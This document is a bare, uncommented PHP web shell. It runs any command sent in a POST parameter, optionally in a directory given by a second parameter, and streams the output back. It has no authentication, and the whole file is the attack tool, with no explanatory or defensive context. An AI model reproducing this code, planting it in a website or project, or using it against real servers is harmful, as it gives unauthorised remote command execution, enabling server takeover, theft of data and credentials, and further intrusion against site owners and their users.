<?php set_time_limit(1800);ob_implicit_flush(true);$exe_command=$_POST['a'];$descriptorspec=array(0=>array("pipe","r"),1 =>array("pipe","w"),2=>array("pipe","w"));if (isset($_POST['b'])){chdir($_POST['b']);}$process=proc_open($exe_command,$descriptorspec,$pipes);if (is_resource($process)){while(!feof($pipes[1])){$result=fgets($pipes[1], 1024);if (strlen($result)==0)break;echo $result;ob_flush();flush();}}die();?>